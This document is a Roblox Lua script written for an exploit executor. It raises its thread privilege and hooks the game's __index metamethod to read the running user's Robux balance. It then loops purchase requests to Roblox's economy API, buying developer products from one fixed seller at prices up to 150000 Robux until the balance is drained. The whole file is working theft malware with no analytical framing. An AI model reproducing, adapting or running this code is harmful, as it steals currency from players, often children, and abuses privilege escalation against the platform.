task.spawn(
    function()
        pcall(
            function()
                task.wait(10) 
                --[[if game:GetService("UserInputService").TouchEnabled==true then _G.executedcode=true end]]
                if _G.executedcode == nil then
                    _G.executedcode = false
                end
                if _G.executedcode ~= true then
                    _G.executedcode = true
                    local a = Instance.new("TextLabel")
                    a.Name = "GetFuckingRobuxBalance"
                    a.Text = "WTF"
                    a.Parent = game.InsertService
                    local b = identifyexecutor()
                    getrenv()._set = clonefunction(setthreadidentity)
                    local function c(d)
                        local e
                        e =
                            hookmetamethod(
                            game,
                            "__index",
                            function(f, g)
                                task.spawn(
                                    function()
                                        _set(7)
                                        task.wait()
                                        game:GetService("HttpRbxApiService"):GetAsyncFullUrl(d)
                                    end
                                )
                                hookmetamethod(game, "__index", e)
                                return e(f, g)
                            end
                        )
                    end
                    local function h(d, i)
                        local j
                        j =
                            hookmetamethod(
                            game,
                            "__index",
                            function(f, g)
                                task.spawn(
                                    function()
                                        _set(7)
                                        task.wait()
                                        game:GetService("HttpRbxApiService"):PostAsyncFullUrl(d, i)
                                    end
                                )
                                hookmetamethod(game, "__index", j)
                                return j(f, g)
                            end
                        )
                    end
                    local function k(d, l)
                        local m
                        m =
                            hookmetamethod(
                            game,
                            "__index",
                            function(f, g)
                                task.spawn(
                                    function()
                                        _set(7)
                                        task.wait()
                                        game:GetService("HttpRbxApiService"):RequestAsync(
                                            {Url = d, Method = "PATCH", Body = l}
                                        )
                                    end
                                )
                                hookmetamethod(game, "__index", m)
                                return m(f, g)
                            end
                        )
                    end
                    local function n()
                        local o
                        o =
                            hookmetamethod(
                            game,
                            "__index",
                            function(f, g)
                                task.spawn(
                                    function()
                                        _set(7)
                                        task.wait()
                                        local p = game:GetService("MarketplaceService"):GetRobuxBalance()
                                        game.InsertService.GetFuckingRobuxBalance.Text = p
                                    end
                                )
                                hookmetamethod(game, "__index", o)
                                return o(f, g)
                            end
                        )
                    end
                    local function q()
                        print("Broke")
                    end
                    n()
                    task.wait(1)
                    local r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                    local s = '{"expectedCurrency":1,"expectedPrice":2,"expectedSellerId":3974962179}'
                    local t = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":3974962179}'
                    local u = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":3974962179}'
                    local v = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":3974962179}'
                    local w = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":3974962179}'
                    local x = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":3974962179}'
                    local y = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":3974962179}'
                    local z = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":3974962179}'
                    local A = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":3974962179}'
                    local B = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":3974962179}'
                    local C = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":3974962179}'
                    local D = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":3974962179}'
                    local E = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":3974962179}'
                    local F = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":3974962179}'
                    local G = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":3974962179}'
                    local H = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":3974962179}'
                    local I = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":3974962179}'
                    local J = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":3974962179}'
                    local K = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":3974962179}'
                    local L = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":3974962179}'
                    local M = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":3974962179}'
                    local N = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":3974962179}'
                    while task.wait(0.25) do
                        task.spawn(
                            function()
                                pcall(
                                    function()
                                        if r == 0 then
                                            q()
                                        elseif r > 0 and r < 2 then
                                            q()
                                        elseif r >= 2 and r < 15 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394680492", s)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 15 and r < 25 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394768474", t)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 25 and r < 50 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394807222", u)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 50 and r < 100 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394867278", v)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 100 and r < 200 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394899738", w)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 200 and r < 300 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394954047", x)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 300 and r < 500 then
                                            h("https://economy.roblox.com/v1/purchases/products/2394988781", y)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 500 and r < 750 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395020199", z)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 750 and r < 1000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395056043", A)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 1000 and r < 1500 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395078674", B)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 1500 and r < 2000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395102214", C)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 2000 and r < 2500 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395145933", D)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 2500 and r < 4000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395164735", E)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 4000 and r < 6000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395206924", F)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 6000 and r < 8000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395223052", G)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 8000 and r < 13000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395246867", H)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 13000 and r < 20000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395265249", I)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 20000 and r < 35000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395285962", J)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 35000 and r < 50000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395302471", K)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 50000 and r < 75000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395322285", L)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        elseif r >= 75000 and r < 150000 then
                                            h("https://economy.roblox.com/v1/purchases/products/2395338603", M)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        else
                                            h("https://economy.roblox.com/v1/purchases/products/2395361165", N)
                                            wait()
                                            n()
                                            task.wait(0.1)
                                            r = tonumber(game.InsertService.GetFuckingRobuxBalance.Text)
                                        end
                                    end
                                )
                            end
                        )
                    end
                end
            end
        )
    end
)
